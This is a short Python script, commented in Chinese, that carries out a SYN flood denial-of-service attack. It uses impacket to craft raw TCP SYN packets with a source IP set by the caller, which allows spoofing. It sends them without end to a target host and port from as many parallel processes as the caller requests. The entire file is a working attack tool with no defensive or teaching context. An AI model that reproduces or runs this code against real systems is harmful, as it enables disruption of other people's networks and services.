from itertools import repeat
import asyncio
import socket
import impacket.ImpactPacket
import random
import multiprocessing
import sys

def synflood(src_ip,src_port,dst_ip,dst_port):
    #loop = asyncio.get_running_loop()
    s = socket.socket(socket.AF_INET,socket.SOCK_RAW,socket.IPPROTO_RAW)
    ip = impacket.ImpactPacket.IP()
    tcp = impacket.ImpactPacket.TCP()
    ip.set_ip_src(src_ip)#你的ip
    ip.set_ip_dst(dst_ip)#目标ip
    ip.set_ip_ttl(255)#ttl
    tcp.set_th_flags(0b00000010)#将syn标志位设为1
    tcp.set_th_sport(src_port)#源端口
    tcp.set_th_dport(dst_port)#目标端口
    tcp.set_th_ack(0)
    tcp.set_th_seq(22903)
    tcp.set_th_win(20000)#设置Window Size
    ip.contains(tcp)
    ip.calculate_checksum()
    for _ in repeat(None):
        s.sendto(ip.get_packet(),(dst_ip,dst_port))

#def asynflood(src_ip,src_port,dst_ip,dst_port):
        #asyncio.run(synFlood(src_ip,src_port,dst_ip,dst_port))

def parameter():
    global src_ip,src_port,dst_ip,dst_port,thread_count
    if len(sys.argv) != 6:
        print("参数错误")
        sys.exit()
    src_ip = sys.argv[1]
    src_port = int(sys.argv[2])
    dst_ip = sys.argv[3]
    dst_port = int(sys.argv[4])
    thread_count = int(sys.argv[5])

if __name__=='__main__':
    parameter()
    pros=[]
    for _ in range(thread_count):
        pros.append(multiprocessing.Process(target=synflood,args=(src_ip,src_port,dst_ip,dst_port)))
    for pro in pros:
        pro.start()
